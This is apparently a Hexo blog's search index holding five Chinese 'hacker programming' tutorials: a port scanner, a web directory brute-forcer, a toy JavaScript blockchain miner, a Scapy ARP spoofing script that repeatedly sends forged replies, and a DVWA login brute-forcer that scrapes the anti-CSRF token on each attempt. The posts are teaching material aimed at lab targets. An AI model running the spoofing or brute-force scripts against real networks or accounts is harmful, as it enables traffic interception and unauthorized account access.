<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>黑客编程（一）：简易端口扫</title>
    <url>/2023/12/15/python(1)/</url>
    <content><![CDATA[<h1 id="黑客编程-—简单端口扫工具"><a href="#黑客编程-—简单端口扫工具" class="headerlink" title="黑客编程 —简单端口扫工具"></a>黑客编程 —简单端口扫工具</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> pyfiglet</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">ascii_banner = pyfiglet.figlet_format(<span class="string">&quot;PORT SCANNER&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ascii_banner)<span class="comment">#打印艺术字</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;10.120.132.137&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>* <span class="number">50</span> )</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scannering Target: &quot;</span>+target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scannering started at: &quot;</span>+<span class="built_in">str</span>(datetime.now()))<span class="comment">#打印当前扫描时间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):<span class="comment">#端口扫描范围在1~499</span></span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        socket.setdefaulttimeout(<span class="number">1</span>)<span class="comment">#设置默认超时时间为1秒钟</span></span><br><span class="line"></span><br><span class="line">        result=s.connect_ex((target,port))</span><br><span class="line">        <span class="keyword">if</span> result ==<span class="number">0</span>:<span class="comment">#如果程序正确，打印下列内容</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Port &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))<span class="comment">#将存在端口打印</span></span><br><span class="line">        s.close()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:<span class="comment">#如果用户按下键盘中断键，打印消息并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Exiting Program !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">except</span> socket.gaierror:<span class="comment">#无法解析，打印相关内容并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Hostname Could Not Be Resolved !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">except</span> socket.error:<span class="comment">#主机未响应，打印相关内容并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\ Server not responding !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>黑客编程（三）：简易目录扫描（第一版）</title>
    <url>/2023/12/15/python(3)/</url>
    <content><![CDATA[<h1 id="黑客编程-—简单端口扫工具"><a href="#黑客编程-—简单端口扫工具" class="headerlink" title="黑客编程 —简单端口扫工具"></a>黑客编程 —简单端口扫工具</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p>
<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描可以帮助你在进行信息收集的时候，提供最主要的域名收集任务，脚本的一个好处是，你可以根据自己所需要扫描的网站进行脚本修改，魔改，更加有针对性的去收集目标网站。</p>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入需要使用的库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="comment"># 构造函数（判定目录是否成立</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_directory</span>(<span class="params">directory_url</span>):</span><br><span class="line">    response = requests.get(directory_url)</span><br><span class="line">    <span class="comment"># 去抓它的返回包</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;!&quot;</span>, response.text):</span><br><span class="line">        <span class="comment"># re.search 寻找指定字符串</span></span><br><span class="line">        <span class="comment"># 找它返回包里有没有！，response是将返回包以文本显示，</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, directory_url  <span class="comment"># 跳过包含感叹号的目录</span></span><br><span class="line">        <span class="comment"># 这个是我扫百度的时候，它很多目录没有，但是会跳转到一个空白页面，所有又过滤一下</span></span><br><span class="line">        <span class="comment"># 这个可以不加，可以根据自己扫描的网站进行修改</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment"># 响应值为200时</span></span><br><span class="line">        <span class="keyword">return</span> directory_url, <span class="literal">None</span>  <span class="comment"># 目录存在</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, directory_url  <span class="comment"># 目录不存在</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_website_directory</span>(<span class="params">url, dictionary_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="comment"># 打开读取文件，只读模式，赋值给f</span></span><br><span class="line">            directories = f.read().splitlines()</span><br><span class="line">            <span class="comment"># 将从字典文件中读取的内容按行分割，并存储在 directories 列表中的代码行</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Starting directory scan for: <span class="subst">&#123;url&#125;</span>&quot;</span>) </span><br><span class="line">        <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">            <span class="comment"># 创建一个线程池执行器</span></span><br><span class="line">            directory_urls = [<span class="string">f&quot;https://<span class="subst">&#123;url&#125;</span>/<span class="subst">&#123;directory&#125;</span>&quot;</span> <span class="keyword">for</span> directory <span class="keyword">in</span> directories]</span><br><span class="line">            <span class="comment"># 用列表推导式创建一个包含完整目录URL的列表。它将每个目录名 directory 与主机URL url 组合</span></span><br><span class="line">            <span class="comment"># 创建形如 https://example.com/directory 的目录URL</span></span><br><span class="line">            results = executor.<span class="built_in">map</span>(scan_directory, directory_urls)</span><br><span class="line">            <span class="comment"># 这行代码使用 executor.map() 方法并发地调用 scan_directory() 函数来扫描目录</span></span><br><span class="line">            <span class="comment"># executor.map() 方法接受一个可调用对象（函数）和一个可迭代对象（目录URL列表）</span></span><br><span class="line">            <span class="comment"># 它会将可迭代对象中的每个元素传递给可调用对象进行处理</span></span><br><span class="line">            <span class="comment"># 这样可以并发地执行scan_directory() 函数，以提高扫描速度。</span></span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                found_directory, not_found_directory = result</span><br><span class="line">                <span class="comment"># result 是一个元组，包含找到的目录URL和未找到的目录URL</span></span><br><span class="line">                <span class="comment"># 解包为 found_directory 和 not_found_directory，可以分别访问这两个值</span></span><br><span class="line">                <span class="comment"># 下面就懂了吧</span></span><br><span class="line">                <span class="keyword">if</span> found_directory <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Directory found: <span class="subst">&#123;found_directory&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> not_found_directory <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Directory not found: <span class="subst">&#123;not_found_directory&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 处理各种报错</span></span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error opening dictionary file: <span class="subst">&#123;dictionary_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error occurred while scanning website: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host_website = <span class="built_in">input</span>(<span class="string">&quot;Please input your host website: &quot;</span>)</span><br><span class="line">    scan_website_directory(host_website, <span class="string">&quot;E:\py\dictionary.txt&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全（一）：挖矿过程js实现</title>
    <url>/2023/12/15/block(1)/</url>
    <content><![CDATA[<h1 id="区块链安全"><a href="#区块链安全" class="headerlink" title="区块链安全"></a>区块链安全</h1><p>2024年了，不能只会一个web吧？多去别的领域看看，还是这句话，在别的领域从基础开发开始会更好！！</p>
<h2 id="冷问题：为什么比特币值钱？"><a href="#冷问题：为什么比特币值钱？" class="headerlink" title="冷问题：为什么比特币值钱？"></a>冷问题：为什么比特币值钱？</h2><ol>
<li><p>稀缺性：比特币的总供应量是有限的，最多只能发行2100万枚。这种固定的供应量使比特币具备稀缺性，类似于黄金等有限资源。稀缺性意味着在需求增加的情况下，其价值会相应上升。</p>
</li>
<li><p>去中心化：比特币是一种去中心化的数字货币，没有中央银行或政府控制。这种去中心化的特性使其不受单一实体的控制，同时也使其免受政府干预、资金限制或货币贬值等因素的影响。这种去中心化的特性吸引了一些人寻求独立于传统金融体系的投资和交易方式。</p>
</li>
<li><p>安全性：比特币使用了密码学和区块链技术来确保交易的安全性。区块链是一个分布式的公开账本，记录了所有比特币交易的历史。这种公开透明的特性使得比特币交易相对安全，并且难以篡改。此外，比特币的交易需要经过验证和确认，使用了加密算法来保护用户的资金和隐私。</p>
</li>
<li><p>去中介化和低成本：比特币使得人们可以直接进行点对点的交易，无需通过传统的金融机构或中介。这种去除中介的交易方式可以降低交易成本和手续费，并提供更快速、便捷的跨境交易。</p>
</li>
</ol>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">SHA256</span> = <span class="keyword">require</span>(<span class="string">&quot;crypto-js/sha256&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transaction</span></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">constructor</span>(fromAddress,toAddress,amount)&#123;</span><br><span class="line">        this.fromAddress = fromAddress</span><br><span class="line">        this.toAddress = toAddress</span><br><span class="line">        this.amount = amount</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//交易数据类</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span> </span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">constructor</span>(timestamp, transacion, previousHash = <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    this.timestamp = timestamp;</span><br><span class="line">    this.transacion = transacion;</span><br><span class="line">    this.previousHash = previousHash;</span><br><span class="line">    this.hash = this.<span class="title function_ invoke__">calcHash</span>();</span><br><span class="line">    this.nonce =<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//区块类</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">calcHash</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">SHA256</span>(this.previousHash + this.timestamp + this.data+this.nonce).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hash加密的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">mineBlock</span>(diffculty)&#123;</span><br><span class="line">    <span class="keyword">while</span>(this.hash.<span class="title function_ invoke__">substring</span>(<span class="number">0</span>,diffculty) !== <span class="title function_ invoke__">Array</span>(diffculty+<span class="number">1</span>).<span class="title function_ invoke__">join</span>(<span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">      this.nonce++</span><br><span class="line">      this.hash = this.<span class="title function_ invoke__">calcHash</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Block Mind: &quot;</span> + this.hash)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//通过判断hash值开头diffculty个0是否相等，不相等随机值nonce增加，进行下一次hash，直到相等，挖矿成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blockchain</span> </span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">constructor</span>() &#123;</span><br><span class="line">    this.chain = [this.<span class="title function_ invoke__">createGenesisBlock</span>()];</span><br><span class="line">    this.diffculty = <span class="number">2</span></span><br><span class="line">    this.pendTransactions = []</span><br><span class="line">    this.miningReward = <span class="number">100</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//定义blockchain类</span></span><br><span class="line">  <span class="title function_ invoke__">createGenesisBlock</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Block</span>(<span class="string">&quot;01/01/2001&quot;</span>, <span class="string">&quot;God&quot;</span>, <span class="string">&quot;000000000000000000000000000000000000000&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//创建第一个创世块</span></span><br><span class="line">  <span class="title function_ invoke__">getLastBlock</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.chain[this.chain.length - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//找前一个块</span></span><br><span class="line">  <span class="title function_ invoke__">createTransaction</span>(transacion)&#123;</span><br><span class="line">    this.pendTransactions.<span class="title function_ invoke__">push</span>(transacion)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//存储交易内容</span></span><br><span class="line">  <span class="title function_ invoke__">minependTransactions</span>(miningRewardAddress)&#123;</span><br><span class="line">    let block= <span class="keyword">new</span> <span class="title class_">Block</span>(Date.<span class="title function_ invoke__">now</span>(),this.pendTransactions)</span><br><span class="line">    block.<span class="title function_ invoke__">mineBlock</span>(this.diffculty)</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Block successfully minded&quot;</span>)</span><br><span class="line">    this.chain.<span class="title function_ invoke__">push</span>(block)</span><br><span class="line">    this.pendTransactions=[</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transaction</span>(<span class="literal">null</span>,miningRewardAddress,this.miningReward)</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//挖矿</span></span><br><span class="line">  <span class="title function_ invoke__">addBlock</span>(newBlock) &#123;</span><br><span class="line">    newBlock.previousHash = this.<span class="title function_ invoke__">getLastBlock</span>().hash;</span><br><span class="line">    newBlock.<span class="title function_ invoke__">mineBlock</span>(this.diffculty)</span><br><span class="line">    this.chain.<span class="title function_ invoke__">push</span>(newBlock)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//将块加入链</span></span><br><span class="line"><span class="title function_ invoke__">getBalanceofAddress</span>(address)&#123;</span><br><span class="line">    let balance =<span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> <span class="variable constant_">block</span> of this.chain)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="variable constant_">trans</span> of block.transacion)&#123;</span><br><span class="line">            <span class="keyword">if</span>(trans.fromAddress === address)&#123;</span><br><span class="line">                balance -= trans.amount</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(trans.toAddress === address)&#123;</span><br><span class="line">                balance += trans.amount</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> balance</span><br><span class="line"><span class="comment">//判断交易者交易完的金额</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let geekCoin =<span class="keyword">new</span> <span class="title class_">Blockchain</span>()</span><br><span class="line">geekCoin.<span class="title function_ invoke__">createTransaction</span>(<span class="keyword">new</span> <span class="title class_">Transaction</span>(<span class="string">&quot;address1&quot;</span>,<span class="string">&quot;address2&quot;</span>,<span class="number">100</span>))</span><br><span class="line">geekCoin.<span class="title function_ invoke__">createTransaction</span>(<span class="keyword">new</span> <span class="title class_">Transaction</span>(<span class="string">&quot;address2&quot;</span>,<span class="string">&quot;address1&quot;</span>,<span class="number">50</span>))</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Balance address1 is&quot;</span>,geekCoin.<span class="title function_ invoke__">getBalanceofAddress</span>(<span class="string">&quot;address1&quot;</span>))</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;staring miner&quot;</span>)</span><br><span class="line">geekCoin.<span class="title function_ invoke__">minependTransactions</span>(<span class="string">&quot;deelmind&quot;</span>)</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Balance address1 is&quot;</span>,geekCoin.<span class="title function_ invoke__">getBalanceofAddress</span>(<span class="string">&quot;address1&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>黑客编程（二）：简单ARP欺骗</title>
    <url>/2023/12/15/python(2)/</url>
    <content><![CDATA[<h1 id="黑客编程-—简单ARP欺骗"><a href="#黑客编程-—简单ARP欺骗" class="headerlink" title="黑客编程 —简单ARP欺骗"></a>黑客编程 —简单ARP欺骗</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p>
<h2 id="ARP欺骗是什么？"><a href="#ARP欺骗是什么？" class="headerlink" title="ARP欺骗是什么？"></a>ARP欺骗是什么？</h2><p>1.ARP协议工作过程<br>假设有两台主机A：192.168.1.1，B：192.168.1.2。当主机A要与主机B通信时，A首先会以广播的方式发送一个ARP请求包，该数据包包含了源IP（192.168.1.1），源MAC（A），目标IP（192.168.1.2），目标MAC（ff:ff:ff:ff:ff:ff）,B收到广播包后会先将A的IP与MAC地址记录到自己的ARP缓存表中，然后给A单播回复ARP replay包，该数据包包含了源IP（192.168.1.2），源MAC（B），目标IP（192.168.1.1），目标MAC（A），A收到该数据包后会将B的IP和MAC记录到自己的ARP缓存中，之后与B的通讯查询缓存即可。</p>
<p>2.ARP欺骗原理<br>由于ARP是无状态协议，所以当一台主机收到一个ARP响应包后不会检查自己是否发送过ARP请求，而是直接将该条记录加载到ARP缓存表中或更新原记录。这样就可以利用向目标主机发送大量的ARP响应包导致目标主机的ARP缓存一致处于错误记录状态，从而达到ARP欺骗目的</p>
<p>2.1单向欺骗<br>单向欺骗是只对目标主机或者网关发起ARP欺骗，攻击者只需要将自己伪装成网关或者一台主机向局域网内其他主机发送ARP响应报文即可</p>
<p>2.1双向欺骗<br>攻击者同时欺骗网关和目标主机，对网关说我是A，对A说我是网关，那么A与网关之间的流量都要经过攻击者的电脑，他们之间的数据也都将被攻击者截获。</p>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#一定要先下载scapy，可以用pip install scapy</span></span><br><span class="line"></span><br><span class="line">target_ip=<span class="string">&quot;目标ip&quot;</span></span><br><span class="line">target_mac=<span class="string">&quot;目标mac&quot;</span></span><br><span class="line"></span><br><span class="line">fake_ip=<span class="string">&quot;伪造ip&quot;</span></span><br><span class="line">fake_mac=<span class="string">&quot;伪造mac&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    arp=ARP()</span><br><span class="line">    <span class="comment">#创建一个ARP对象</span></span><br><span class="line">    <span class="comment">#设置ARP数据包的以下的设置</span></span><br><span class="line">    arp.psrc=fake_ip<span class="comment">#源IP</span></span><br><span class="line">    arp.pdst=target_ip<span class="comment">#目标IP</span></span><br><span class="line">    arp.hwsrc=fake_mac<span class="comment">#源MAC</span></span><br><span class="line">    arp.hwdst=target_mac<span class="comment">#目标MAC</span></span><br><span class="line">    pkt=arp<span class="comment">#将arp对象赋值给pkt变量</span></span><br><span class="line"></span><br><span class="line">    send(pkt)<span class="comment">#发包，进行欺骗</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment">#主函数的入口</span></span><br><span class="line">    i=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:<span class="comment">#进行死循环</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)<span class="comment">#每次循环延时1秒</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次攻击&quot;</span>.<span class="built_in">format</span>(i))<span class="comment">#记录是第几次进攻</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        arp_spoof()<span class="comment">#调用上面的函数</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>黑客编程（四）：dvwa爆破模块高级脚本</title>
    <url>/2023/12/15/python(4)/</url>
    <content><![CDATA[<h1 id="黑客编程-—简单端口扫工具"><a href="#黑客编程-—简单端口扫工具" class="headerlink" title="黑客编程 —简单端口扫工具"></a>黑客编程 —简单端口扫工具</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p>
<h1 id="带token验证"><a href="#带token验证" class="headerlink" title="带token验证"></a>带token验证</h1><p>由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以需要每次爆破都需要去抓取token进行提交，所以使用脚本是有必要的</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>token值在返回包中， <form> 里的 <input> 里的hiden值中的value里的内容就是 token 存储位置</p>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">headers=&#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.1.7:81&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://127.0.0.1/vulnerabilities/brute/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#指定请求头</span></span><br><span class="line">requrl=<span class="string">&quot;http://192.168.1.7:81/vulnerabilities/brute/&quot;</span></span><br><span class="line"><span class="comment">#指定url</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">requrl,header</span>):<span class="comment">#构建拿token的函数</span></span><br><span class="line">    response=requests.get(url=requrl,headers=headers,stream = <span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#获取返回包的源代码</span></span><br><span class="line">    <span class="built_in">print</span>(response.status_code,<span class="built_in">len</span>(response.text))</span><br><span class="line">    <span class="comment">#打印出响应的状态码和响应内容的长度。</span></span><br><span class="line">    <span class="comment">#status_code表示HTTP响应的状态码，content表示响应的内容。</span></span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="comment">#使用BeautifulSoup库对响应的HTML页面进行解析。</span></span><br><span class="line">    <span class="comment">#response.text获取响应的文本内</span></span><br><span class="line">    <span class="built_in">input</span>=soup.form.select(<span class="string">&quot;input[type=&#x27;hidden&#x27;]&quot;</span>)</span><br><span class="line">    <span class="comment">#soup.form选择html中的&lt;form&gt;元素</span></span><br><span class="line">    <span class="comment">#select选择该表单元素为hidden，返回的结果是一个列表，存储了满足条件的所有&lt;input&gt;元素</span></span><br><span class="line">    user_token=<span class="built_in">input</span>[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="comment">#将token存在user_token里</span></span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line">    <span class="comment">#返回获取到的用户token</span></span><br><span class="line"></span><br><span class="line">user_token=get_token(requrl,headers)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;E:\dict.txt&quot;</span>):<span class="comment">#打开字典</span></span><br><span class="line">    requrl=<span class="string">&quot;http://192.168.1.7:81/vulnerabilities/brute/index.php?username=admin&amp;password=&quot;</span>+line.strip()+<span class="string">&quot;&amp;Login=Login&amp;user_token=&quot;</span>+user_token</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i,<span class="string">&#x27;admin&#x27;</span>,line.strip(),end=<span class="string">&quot; &quot;</span>)<span class="comment">#编辑输出格式</span></span><br><span class="line">    user_token=get_token(requrl,headers)<span class="comment">#执行函数</span></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):<span class="comment">#循环20次时，直接结束</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


























]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
